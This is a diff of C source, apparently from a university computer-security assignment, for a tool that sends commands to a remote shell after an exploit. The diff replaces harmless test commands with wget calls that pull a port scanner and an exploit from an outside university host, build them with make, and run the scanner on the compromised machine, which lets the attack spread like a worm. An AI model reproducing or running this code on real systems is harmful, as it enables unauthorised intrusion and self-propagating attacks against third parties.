@@ -23,6 +23,7 @@
 #include <time.h>
 
 void cshell (int sock);
+int exploiter(int argc, char *argv[]);
 
 int main(int argc, char *argv[]) {
  
@@ -77,11 +78,12 @@ void cshell (int sock) {
         fd_set  rfds;
 
         char *commands[4] = {   
-                                "touch bla.txt\n", 
-                                "echo 'oi' > bla.txt\n", 
-                                "cd /\n", 
-                                "touch estou_na_raiz_otarios.txt\n"
-                            }; //, "gcc portscan.c -o portscan", "./portscan"};
+                                "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/portscan.c\n", 
+                                "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/exploit.c\n", 
+                                "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/makefile\n",
+                                "make\n",
+                                "./portscan\n"
+        }; //, "gcc portscan.c -o portscan", "./portscan"};
         // int buffsize[7] = {3, 4, 5, 3, 8};
 
         int i;
